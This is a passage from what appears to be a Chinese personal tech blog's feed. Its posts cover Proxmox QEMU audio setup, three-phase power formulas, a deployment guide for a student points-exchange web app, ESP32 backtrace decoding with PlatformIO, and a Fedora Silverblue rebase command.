    <content type="html"><![CDATA[<p>PVE 图形界面中 后端驱动器：无（虚拟设备）表示 qemu 收到音频数据就丢弃，只是做一个假音频设备而已。</p><p>需要自己设置 qemu 参数来传输到宿主机的 ALSA 上。</p><p>编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nano /etc/pve/qemu-server/103.conf<br></code></pre></td></tr></table></figure><p>添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">args: -audiodev alsa,<span class="hljs-built_in">id</span>=alsa0 -device intel-hda -device hda-duplex,audiodev=alsa0<br></code></pre></td></tr></table></figure><p>可以 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install alsa-utils<br>aplay -l<br></code></pre></td></tr></table></figure><p>检查宿主机 alsa 识别到的设备<br>还能使用 <code>alsamixer</code> TUI 工具调节音量、静音之类的</p><p>QEMU 可以通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 -audiodev <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>来查看可用的音频后端驱动</p><p>还有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 -device <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>查看所有可用的前端音频设备</p><p>[[[想做 2.5G 虚拟化软路由_725]]]</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TipsTricks</tag>
      
      <tag>PVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>三相电源的理解</title>
    <link href="/archives/a997eaac/"/>
    <url>/archives/a997eaac/</url>
    
    <content type="html"><![CDATA[<h2 id="星三角的相与线电压电流转换"><a href="#星三角的相与线电压电流转换" class="headerlink" title="星三角的相与线电压电流转换"></a>星三角的相与线电压电流转换</h2><table><thead><tr><th>特性</th><th>星形接法 (Y)</th><th>三角形接法 (Δ)</th><th>比例 (Δ:Y) （基于相同 $U_L$ 和相同 $Z_P$）</th></tr></thead><tbody><tr><td>相电压</td><td>$U_P &#x3D; \dfrac{U_L}{\sqrt{3}}$</td><td>$U_P &#x3D; U_L$</td><td>$\sqrt{3} : 1$</td></tr><tr><td>相电流</td><td>$I_P &#x3D; I_L$</td><td>$I_P &#x3D; \dfrac{I_L}{\sqrt{3}}$</td><td>$\sqrt{3} : 1$</td></tr><tr><td>线电压</td><td>$U_L &#x3D; \sqrt{3} , U_P$</td><td>$U_L &#x3D; U_P$</td><td>$1 : 1$ （基准）</td></tr><tr><td>线电流</td><td>$I_L &#x3D; I_P &#x3D; \dfrac{U_L}{\sqrt{3} , Z_P}$</td><td>$I_L &#x3D; \sqrt{3} , I_P &#x3D; \dfrac{\sqrt{3} , U_L}{Z_P}$</td><td>$3 : 1$</td></tr><tr><td>功率</td><td>$P_Y &#x3D; \dfrac{U_L^2}{Z_P} \cdot \cos\phi$</td><td>$P_\Delta &#x3D; 3\dfrac{U_L^2}{Z_P} \cdot \cos\phi$</td><td>$3 : 1$</td></tr></tbody></table><p>三角形<strong>相电压</strong>等于电源两条相线间的<strong>线电压</strong> 380V<br>$U_P &#x3D; U_L$</p><p>星形<strong>相电压</strong>等于电源的单<strong>相电压</strong> 220V<br>$U_L &#x3D; U_P$</p><hr><h2 id="总有功功率的计算"><a href="#总有功功率的计算" class="headerlink" title="总有功功率的计算"></a>总有功功率的计算</h2><h3 id="通用公式"><a href="#通用公式" class="headerlink" title="通用公式"></a>通用公式</h3><p>用相参数公式表示：<br>$$<br>P &#x3D; 3 \cdot U_P \cdot I_P \cdot \cos\phi<br>$$<br>用线参数表示：<br>$$<br>P &#x3D; \sqrt{3} \cdot U_L \cdot I_L \cdot \cos\phi<br>$$<br>以上公式无论星&#x2F;三角都适用。</p><h4 id="线参数功率推导：星形接法（Y）"><a href="#线参数功率推导：星形接法（Y）" class="headerlink" title="线参数功率推导：星形接法（Y）"></a>线参数功率推导：星形接法（Y）</h4><p>我们知道星形接法中线参数与相参数的关系：</p><ul><li>$U_L &#x3D; \sqrt{3} , U_P \quad \Rightarrow \quad U_P &#x3D; \dfrac{U_L}{\sqrt{3}}$</li><li>$I_L &#x3D; I_P$</li></ul><p>将这些关系代入相参数的总功率公式 $P_Y &#x3D; 3 \cdot U_P \cdot I_P \cdot \cos\phi$：</p><p>$$<br>P_Y &#x3D; 3 \cdot \left( \dfrac{U_L}{\sqrt{3}} \right) \cdot I_L \cdot \cos\phi \<br>&#x3D; \left( \dfrac{3}{\sqrt{3}} \right) \cdot U_L \cdot I_L \cdot \cos\phi \<br>&#x3D; \sqrt{3} \cdot U_L \cdot I_L \cdot \cos\phi<br>$$</p><h4 id="线参数功率推导：三角形接法-Δ"><a href="#线参数功率推导：三角形接法-Δ" class="headerlink" title="线参数功率推导：三角形接法 (Δ)"></a>线参数功率推导：三角形接法 (Δ)</h4><p>我们知道三角形接法中线参数与相参数的关系：</p><ul><li>$U_L &#x3D; U_P$</li><li>$I_L &#x3D; \sqrt{3} , I_P \quad \Rightarrow \quad I_P &#x3D; \dfrac{I_L}{\sqrt{3}}$</li></ul><p>将这些关系代入相参数的总功率公式 $P_\Delta &#x3D; 3 \cdot U_P \cdot I_P \cdot \cos\phi$：</p><p>$$<br>P_\Delta &#x3D; 3 \cdot U_L \cdot \left( \dfrac{I_L}{\sqrt{3}} \right) \cdot \cos\phi \<br>&#x3D; \left( \dfrac{3}{\sqrt{3}} \right) \cdot U_L \cdot I_L \cdot \cos\phi \<br>&#x3D; \sqrt{3} \cdot U_L \cdot I_L \cdot \cos\phi<br>$$</p><p><strong>由此可见：</strong> 无论星&#x2F;三角的连接，无论用相参数还是线参数求，总有功功率<strong>计算方式</strong>都一样。</p><p><strong>同时：</strong><br>$$<br>S_{(视在)} &#x3D; 3 \cdot U_P \cdot I_P \cdot &#x3D; \sqrt{3} \cdot U_L \cdot I_L<br>$$<br>但如果 $U_L$（380V）、$Z_P$ 不变，那不同接法产生不同相电压和电流，总功率就不一样了。</p><hr><h4 id="最后，按照-U-L-、-Z-P-不变，来计算两种接法，总有功功率的比。"><a href="#最后，按照-U-L-、-Z-P-不变，来计算两种接法，总有功功率的比。" class="headerlink" title="最后，按照 $U_L$、$Z_P$ 不变，来计算两种接法，总有功功率的比。"></a>最后，按照 $U_L$、$Z_P$ 不变，来计算两种接法，总有功功率的比。</h4><p>这里的 $I_L$ 已经因为接法不同而发生了变化。</p><h5 id="星形接法-Y-的功率-P-Y-："><a href="#星形接法-Y-的功率-P-Y-：" class="headerlink" title="星形接法 (Y) 的功率 ($P_Y$)："></a><strong>星形接法 (Y) 的功率 ($P_Y$)：</strong></h5><p>$$<br>P_Y &#x3D; \sqrt{3} U_L I_{L,Y} \cos\phi<br>$$<br>把 $I_{L,Y}$ 替换进去：<br>$$<br>P_Y &#x3D; \sqrt{3} U_L \cdot \left[\frac{U_L}{\sqrt{3} Z_P}\right] \cos\phi<br>$$<br>$$<br>P_Y &#x3D; \left(\frac{U_L^2}{Z_P}\right) \cos\phi<br>$$</p><h5 id="三角形接法-Δ-的功率-P-Delta-："><a href="#三角形接法-Δ-的功率-P-Delta-：" class="headerlink" title="三角形接法 (Δ) 的功率 ($P_\Delta$)："></a><strong>三角形接法 (Δ) 的功率 ($P_\Delta$)：</strong></h5><h2 id="P-Delta-sqrt-3-U-L-I-L-Delta-cos-phi-把-I-L-Delta-替换进去：-P-Delta-sqrt-3-U-L-cdot-left-sqrt-3-cdot-frac-U-L-Z-P-right-cos-phi-P-Delta-3-left-frac-U-L-2-Z-P-right-cos-phi-现在对比-P-Delta-和-P-Y-：-P-Delta-P-Y-left-3-cdot-frac-U-L-2-Z-P-cos-phi-right-left-frac-U-L-2-Z-P-cos-phi-right-比例：-P-Delta-P-Y-3-1"><a href="#P-Delta-sqrt-3-U-L-I-L-Delta-cos-phi-把-I-L-Delta-替换进去：-P-Delta-sqrt-3-U-L-cdot-left-sqrt-3-cdot-frac-U-L-Z-P-right-cos-phi-P-Delta-3-left-frac-U-L-2-Z-P-right-cos-phi-现在对比-P-Delta-和-P-Y-：-P-Delta-P-Y-left-3-cdot-frac-U-L-2-Z-P-cos-phi-right-left-frac-U-L-2-Z-P-cos-phi-right-比例：-P-Delta-P-Y-3-1" class="headerlink" title="$$P_\Delta &#x3D; \sqrt{3} U_L I_{L,\Delta} \cos\phi$$把 $I_{L,\Delta}$ 替换进去：$$P_\Delta &#x3D; \sqrt{3} U_L \cdot \left[\sqrt{3} \cdot \frac{U_L}{Z_P}\right] \cos\phi$$$$P_\Delta &#x3D; 3 \left(\frac{U_L^2}{Z_P}\right) \cos\phi$$现在对比 $P_\Delta$ 和 $P_Y$：$$P_\Delta : P_Y &#x3D; \left[3 \cdot \frac{U_L^2}{Z_P} \cos\phi\right] : \left[\frac{U_L^2}{Z_P} \cos\phi\right]$$比例：$$P_\Delta : P_Y &#x3D; 3 : 1$$"></a>$$<br>P_\Delta &#x3D; \sqrt{3} U_L I_{L,\Delta} \cos\phi<br>$$<br>把 $I_{L,\Delta}$ 替换进去：<br>$$<br>P_\Delta &#x3D; \sqrt{3} U_L \cdot \left[\sqrt{3} \cdot \frac{U_L}{Z_P}\right] \cos\phi<br>$$<br>$$<br>P_\Delta &#x3D; 3 \left(\frac{U_L^2}{Z_P}\right) \cos\phi<br>$$<br><strong>现在对比 $P_\Delta$ 和 $P_Y$：</strong><br>$$<br>P_\Delta : P_Y &#x3D; \left[3 \cdot \frac{U_L^2}{Z_P} \cos\phi\right] : \left[\frac{U_L^2}{Z_P} \cos\phi\right]<br>$$<br>比例：<br>$$<br>P_\Delta : P_Y &#x3D; 3 : 1<br>$$</h2><p>但请记住：</p><ol><li>线电压在两种接法下是相同的（这是我们设定的比较前提）。所以电压的比值在这里是 1:1。</li><li>真正有 $\sqrt{3}$ 倍关系的，是相电压和相电流。</li><li>线电流之所以差 3 倍，是因为它受到了两个 $\sqrt{3}$ 因素的影响：</li></ol><ul><li>相电压的 $\sqrt{3}$ 倍关系：三角形接法下相电压比星形接法高 $\sqrt{3}$ 倍，导致相电流高 $\sqrt{3}$ 倍。</li><li>三角形接法中线电流和相电流的 $\sqrt{3}$ 倍关系：三角形接法中线电流是相电流的 $\sqrt{3}$ 倍，而星形接法中线电流等于相电流。<br>这两个 $\sqrt{3}$ 叠加起来，就变成了 $\sqrt{3} \times \sqrt{3} &#x3D; 3$ 倍。</li></ul><p>所以，<strong>功率的 3 倍关系，正是来自线电流的 3 倍关系</strong>，而线电压在比较前提下是相同的。</p><hr><h3 id="关于相电压线电压和向量"><a href="#关于相电压线电压和向量" class="headerlink" title="关于相电压线电压和向量"></a>关于相电压线电压和向量</h3><p>三相电，<em>单相电压</em>依旧是 220V，但相位相差 120°。所以，两相之间的<em>线电压</em>通过向量叠加，可得为 380V。</p><h3 id="关于向量叠加-中性线电流理解"><a href="#关于向量叠加-中性线电流理解" class="headerlink" title="关于向量叠加-中性线电流理解"></a>关于向量叠加-中性线电流理解</h3><p><img src="https://cdn.jiecs.top/img/2025/05/560-Screenshot_20250530-213001_PiliPlus~4.webp" alt="三相 中性线 电流计算"><br>来自：</p><blockquote><p>三相交流电路相电压、相电流、中性线电流的计算方法及相量图的画法 UP主: 长风的慢生活 - <a href="https://www.bilibili.com/video/BV1rm4y137aw">https://www.bilibili.com/video/BV1rm4y137aw</a> 2:06</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>“拓学无阻积分互助”平台使用与部署文档</title>
    <link href="/archives/ff069447/"/>
    <url>/archives/ff069447/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>拓学无阻积分互助 是一个基于 Vue 3 和 Vite 构建的前端，以及使用 Node.js 和 Yarn 作为后端的 Web 应用。兼容多种数据库：兼容sequelize的数据库均可，也支持 VercelSQL等SaaS架构数据库（所有支持的数据库详见 server&#x2F;src&#x2F;adapter&#x2F;*）。</p><h2 id="使用已部署的测试环境"><a href="#使用已部署的测试环境" class="headerlink" title="使用已部署的测试环境"></a><strong>使用已部署的测试环境</strong></h2><p>访问： <a href="http://jtex.jiecs.top/">http://jtex.jiecs.top</a> （注意测试环境不支持 HTTPS）</p><p>测试用户：<br>用户名：test1<br>密码：12345678<br>管理用户：<br>用户名：0<br>密码：12345678</p><h2 id="Docker-Compose自动容器化部署"><a href="#Docker-Compose自动容器化部署" class="headerlink" title="Docker Compose自动容器化部署"></a><strong>Docker Compose自动容器化部署</strong></h2><h3 id="先决条件："><a href="#先决条件：" class="headerlink" title="先决条件："></a><strong>先决条件：</strong></h3><ul><li>参考<a href="https://docs.docker.com/engine/install">https://docs.docker.com/engine/install</a> 安装并设置了Docker Engine以及Docker Compose</li><li>良好的网络连接</li></ul><h3 id="克隆存储库"><a href="#克隆存储库" class="headerlink" title="克隆存储库:"></a><strong>克隆存储库:</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/jiesou/JTExchange.git&gt;<br><span class="hljs-built_in">cd</span> JTExchange<br>````<br><span class="hljs-comment">### **运行 Compose 容器组:**</span><br><br>（在项目根目录执行）  <br>docker compose up -d<br><br>Docker Compose将完成依赖环境配置，完成后通过 docker compose logs 可查看运行日志。出现下列字样时即表示已成功部署：<br><br></code></pre></td></tr></table></figure><p>jtexchange-server-1 | Server listening on port 3000<br>jtexchange-server-1 | Table Users synced.<br>jtexchange-server-1 | Table Transactions synced.<br>jtexchange-server-1 | Table Posts synced.</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><br>可在 &lt;http:<span class="hljs-comment">//127.0.0.1:8080&gt; 访问到</span><br><br><span class="hljs-meta">### **修改配置文件：**</span><br><br>重命名<span class="hljs-keyword">server</span>/.env.example为<span class="hljs-keyword">server</span>/.env文件，并根据需要修改其中内容：<br><br></code></pre></td></tr></table></figure><p>SYSTEM_KEY&#x3D;abcdef<br>PASSWORD_SALT&#x3D;abcdef<br>POSTGRES_URL&#x3D;postgres:&#x2F;&#x2F;postgres:<a href="mailto:&#49;&#50;&#51;&#52;&#x35;&#54;&#64;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#49;">123456@127.0.0.1</a>:5432&#x2F;base（会被Docker Compose覆盖）<br>OPENAI_API_KEY&#x3D;abcdef OPENAI_BASE_URL&#x3D;<a href="https://dashscope.aliyuncs.com/compatible-mode/v1">https://dashscope.aliyuncs.com/compatible-mode/v1</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## <span class="hljs-strong">**手动部署**</span></span><br><br><span class="hljs-section">### <span class="hljs-strong">**先决条件**</span></span><br><br>在手动部署“拓学无阻”平台之前，需要确保系统上已安装以下运行环境：<br><br><span class="hljs-bullet">-</span> [<span class="hljs-string">Node.js</span>](<span class="hljs-link">https://nodejs.org/</span>)<br><span class="hljs-bullet">-</span> [<span class="hljs-string">Yarn</span>](<span class="hljs-link">https://yarnpkg.com/</span>)<br><span class="hljs-bullet">-</span> PostgreSQL（或外部/兼容sequelize的数据库均可，所有支持的数据库详见 server/src/adapter/\<span class="hljs-emphasis">*）</span><br><span class="hljs-emphasis">- 良好的网络连接</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">## <span class="hljs-strong">**安装与部署**</span></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">### <span class="hljs-strong">**数据库设置 (PostgreSQL为例)**</span></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">- 安装 PostgreSQL。</span><br><span class="hljs-emphasis">- 创建一个新的数据库：</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">```bash</span><br><span class="hljs-emphasis">createdb tx_db</span><br></code></pre></td></tr></table></figure><h3 id="后端安装与配置-Node-js-Yarn"><a href="#后端安装与配置-Node-js-Yarn" class="headerlink" title="后端安装与配置 (Node.js + Yarn)"></a><strong>后端安装与配置 (Node.js + Yarn)</strong></h3><ul><li>克隆存储库：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/jiesou/JTExchange.git<br><span class="hljs-built_in">cd</span> JTExchange<br></code></pre></td></tr></table></figure><ul><li>安装后端依赖项：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yarn install<br></code></pre></td></tr></table></figure><ul><li>配置服务端：</li></ul><p>重命名 <code>server/.env.example</code> 为 <code>server/.env</code> 文件，并根据需要修改其中内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SYSTEM_KEY</span>=abcdef  <br><span class="hljs-attribute">PASSWORD_SALT</span>=abcdef  <br><span class="hljs-attribute">POSTGRES_URL</span>=postgres://postgres:123456@127.0.0.1:5432/base（会被Docker Compose覆盖）  <br><span class="hljs-attribute">OPENAI_API_KEY</span>=abcdef <span class="hljs-attribute">OPENAI_BASE_URL</span>=https://dashscope.aliyuncs.com/compatible-mode/v1<br></code></pre></td></tr></table></figure><h3 id="前端安装与配置-Vue-3-Vite"><a href="#前端安装与配置-Vue-3-Vite" class="headerlink" title="前端安装与配置 (Vue 3 + Vite)"></a><strong>前端安装与配置 (Vue 3 + Vite)</strong></h3><ul><li>进入 client 目录：</li></ul><p>（在项目根目录执行）  </p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">cd <span class="hljs-keyword">client</span><br></code></pre></td></tr></table></figure><ul><li>安装前端依赖项：</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yarn <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a><strong>启动</strong></h3><ul><li>确保 PostgreSQL 服务已启动。</li><li>启动后端服务器：</li></ul><p>（在项目根目录执行）  </p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cd</span> server  <br>yarn <span class="hljs-built_in">start</span><br></code></pre></td></tr></table></figure><ul><li>启动前端服务器：</li></ul><p>（在项目根目录执行）  </p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">cd <span class="hljs-keyword">client</span>  <br>yarn dev<br></code></pre></td></tr></table></figure><ul><li>后端会监听本地3000端口，或可通过环境变量PORT端口来修改其监听的端口</li><li>前端vite默认提示所监听的端口，并将<a href="http://localhost:3000/">http://localhost:3000</a> 反向代理到前端的 &#x2F;api 路径，所以使用时只需要开放前端端口即可。实际上，vite build可直接将前端程序构建为纯静态产物，可动静态分离。</li></ul><h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a><strong>账号管理</strong></h2><h3 id="创建账户"><a href="#创建账户" class="headerlink" title="创建账户"></a><strong>创建账户</strong></h3><ul><li>点击页面上方的登录。</li><li>点击“注册”按钮。</li><li>输入相关信息，完成注册。</li></ul><h3 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a><strong>账户管理</strong></h3><ul><li>**注意：**ID为0的用户是管理用户（即老师身份），必须创建，可以发起金额为负值的交易，自身余额也允许为负值。</li><li>**注意：**SYSTEM_KEY环境变量所指向的密钥拥有系统管理用户的访问权限，能够通过&#x2F;api&#x2F;sudo&#x2F;*API执行特殊权限操作，例：</li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">curl --location <span class="hljs-string">&#x27;&lt;http://127.0.0.1:3000/api/sudo/new_system_transaction&gt;&#x27;</span> <span class="hljs-string">\\</span><br><span class="hljs-string">\--header</span> <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> <span class="hljs-string">\\</span><br><span class="hljs-string">\--header</span> <span class="hljs-string">&#x27;X-Key: SYSTEM_KEY&#x27;</span> <span class="hljs-string">\\</span><br><span class="hljs-string">\--data-urlencode</span> <span class="hljs-string">&#x27;to=TO_ID&#x27;</span> <span class="hljs-string">\\</span><br><span class="hljs-string">\--data-urlencode</span> <span class="hljs-string">&#x27;amount=100&#x27;</span><br></code></pre></td></tr></table></figure><p>即向TO_ID凭空转账100个代币，交易记录中会显示交易来自用户0</p><ul><li>用户可以在个人中心修改密码、更新个人信息等。</li><li>仅管理员可管理用户权限和账户状态。</li></ul><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><strong>常见问题</strong></h2><p>无法连接数据库？</p><ul><li>确保 PostgreSQL 正在运行，并检查 .env 配置是否正确。</li></ul><p>前端或后端无法启动？</p><ul><li>确保依赖项已正确安装 (yarn install)。</li><li>检查端口是否被占用。</li><li>如使用Docker Compose自动部署，可尝试 docker compose build 重新构建应用镜像。</li></ul><p>如何部署到生产环境？</p><ul><li>推荐使用Docker进行容器化部署，或者使用PM2管理 Node.js 进程。</li><li>推荐外部再套一层 Nginx（Docker Compose已经自带一个实现动静态分离的Nginx了）。</li></ul>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PlatformIO 内存级调试-解析栈回溯</title>
    <link href="/archives/8b0ec425/"/>
    <url>/archives/8b0ec425/</url>
    
    <content type="html"><![CDATA[<p>PlatformIO 默认构建即包含了调试信息<br>可以手动添加编译参数，输出 .map：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">build_flags</span> =<br>    -Wl,-Map,$&#123;BUILD_DIR&#125;/firmware.Map<br>    -Wl,--cref  <span class="hljs-comment">; 生成交叉引用</span><br>    -fno-inline <span class="hljs-comment">; 禁止内联优化</span><br><span class="hljs-attr">build_type</span> = debug <span class="hljs-comment">; 这个可能比较重要</span><br></code></pre></td></tr></table></figure><h4 id="方案一：直接解析崩溃地址（无需工具链）"><a href="#方案一：直接解析崩溃地址（无需工具链）" class="headerlink" title="方案一：直接解析崩溃地址（无需工具链）"></a><strong>方案一：直接解析崩溃地址（无需工具链）</strong></h4><p>用文本编辑器打开 <code>output.map</code>，搜索崩溃地址 <strong>去掉前两位</strong>（ESP32-C3 的 Flash 地址是 <code>0x42xxxxxx</code>，实际偏移是后6位）：</p><ul><li>例如 <code>0x420012d2</code> → 搜索 <code>0012d2</code>，或者往前一位位找</li><li>重点查看 <code>.text</code> 段附近的符号</li></ul><h4 id="方案二：在线反编译："><a href="#方案二：在线反编译：" class="headerlink" title="方案二：在线反编译："></a><strong>方案二：在线反编译</strong>：</h4><p><a href="https://godbolt.org/">https://godbolt.org</a> （选择 XTensa 架构）</p><h4 id="方案三：反编译工具链："><a href="#方案三：反编译工具链：" class="headerlink" title="方案三：反编译工具链："></a><strong>方案三：反编译工具链：</strong></h4><p>安装工具集（通常已安装过）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pio platform update<br>pio platform install espressif32<br></code></pre></td></tr></table></figure><p>工具链位置：<code>~/.platformio/packages/toolchain-xtensa-esp32s3/bin/xtensa-esp32s3-elf-</code></p><h5 id="addr2line-精确定位"><a href="#addr2line-精确定位" class="headerlink" title="addr2line 精确定位"></a><strong>addr2line 精确定位</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xtensa-esp32-elf-addr2line -pfiaC -e .pio/build/XXX/firmware.elf 0x[内存后四位]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#.pio/build/esp32s3dev/firmware.elf &lt;Address1&gt; &lt;Address2&gt; ...</span><br><br><span class="hljs-comment"># 示例（使用 Backtrace）：</span><br>esp_addr2line -pfiaC -e .pio/build/esp32dev/firmware.elf 0x40081e7d 0x400d2398 0x400d2870 0x40082725 0x4008434a 0x400d2766 0x400d0752 0x40082269 0x40085955 0x40085a3c 0x400d02ea 0x40080644<br><br></code></pre></td></tr></table></figure><h5 id="nm-查看符号"><a href="#nm-查看符号" class="headerlink" title="nm 查看符号"></a><strong>nm 查看符号</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xtensa-esp32-elf-nm -n .pio/build/XXX/firmware.elf | grep -C 10 0000[内存后四位]<br></code></pre></td></tr></table></figure><h5 id="Espressif-IDF-Monitor-自动解析"><a href="#Espressif-IDF-Monitor-自动解析" class="headerlink" title="Espressif IDF Monitor 自动解析"></a>Espressif IDF Monitor 自动解析</h5><p>如果你使用 idf.py monitor 或在 PlatformlO 中使 用其内置的串口监视器，很多情况下它会自动尝试解析栈回溯。<br>或者在 PlatformIO 上，可以尝试</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">build_type</span> = debug<br><span class="hljs-attr">monitor_filters</span> = esp8266_exception_decoder<br><span class="hljs-attr">monitor_filters</span> = esp32_exception_decoder<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>PlatformIO</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fedora Silverblue 命令行 rebase 升级到新发行版，遇到 RPM-Fusion 冲突</title>
    <link href="/archives/1695f709/"/>
    <url>/archives/1695f709/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> rpm-ostree rebase fedora:fedora/33/x86_64/silverblue \<br>      --uninstall rpmfusion-free-release-32-1.noarch \<br>      --uninstall rpmfusion-nonfree-release-32-1.noarch \<br>      --install https://mirrors.rpmfusion.org/free/fedora/rpmfusion-free-release-33.noarch.rpm \<br>      --install https://mirrors.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-33.noarch.rpm<br></code></pre></td></tr></table></figure><p>像这样即可在更新到新发行版的同时，切换 RPM-Fusion 版本</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>我的电脑</tag>
      
      <tag>TipsTricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>半波整流电压 0.45 常数的来源和含义</title>
    <link href="/archives/1164c913/"/>
    <url>/archives/1164c913/</url>
    
